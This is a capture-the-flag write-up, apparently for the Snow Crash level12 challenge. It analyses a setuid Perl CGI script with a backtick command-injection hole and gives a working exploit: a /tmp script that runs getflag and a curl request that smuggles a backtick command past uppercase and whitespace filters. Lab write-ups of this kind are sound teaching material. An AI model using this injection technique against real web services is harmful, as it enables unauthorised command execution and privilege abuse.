``` shell
ls -l
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```

Let's inspect `level12.pl`:
``` perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```

What is interesting for us:

1. Param `x` is passed to function `t`:
``` perl
n(t(param("x"), param("y")));
```

2. Function `t` performs system call, we'll try to exploit it:
``` perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

3. All lowercase letters in `x` param are replaced with uppercase:
``` perl
$xx = $_[0];
$xx =~ tr/a-z/A-Z/;
```

4. Everything after deleminters is gettings cut:
``` perl
$xx =~ s/\s.*//;
```

So, we can't use lowercase letters and can't use whitespaces.
Let's write a script that retrieves the token:
``` shell
echo "getflag > /tmp/level11.token" > /tmp/level11.exploit
chmod +x /tmp/level11.exploit
```

Next run the perl script like this:
``` shell
EXPLOIT=/tmp/level11.exploit && curl localhost:4646?x='`$EXPLOIT`'
```

**Resources**
https://stackoverflow.com/questions/3638205/whats-the-difference-between-tr-and-s-when-using-regex-in-perl